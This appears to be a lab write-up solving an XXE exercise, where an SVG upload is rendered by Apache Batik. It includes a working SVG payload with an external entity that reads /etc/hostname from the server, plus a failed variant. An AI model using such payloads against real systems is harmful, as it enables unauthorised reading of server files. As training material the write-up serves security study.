# Solution

NOTE: For some reason, i cant upload the image file with correct product id. So, i just exploited the XXE manually.

1. From lab description we can mention `Apache Batik library` that was used to process the uploaded image file. Shortly, Apache Batik converts SVG files to PNG files.
2. I googled for XXE attack to Apache Batik. https://insinuator.net/2015/03/xxe-injection-in-apache-batik-library-cve-2015-0250/
3. I created a simple SVG file with XXE payload and uploaded it to the server.

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-family="Verdana" font-size="32" x="20" y="80">&xxe;</text></svg>
```

Also i had failure attempts to upload the svg. But nothing happened was outputed. So, we need to enclose payload in text tag like above. Below is a example of failed attempt.

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
&xxe;
</svg>
```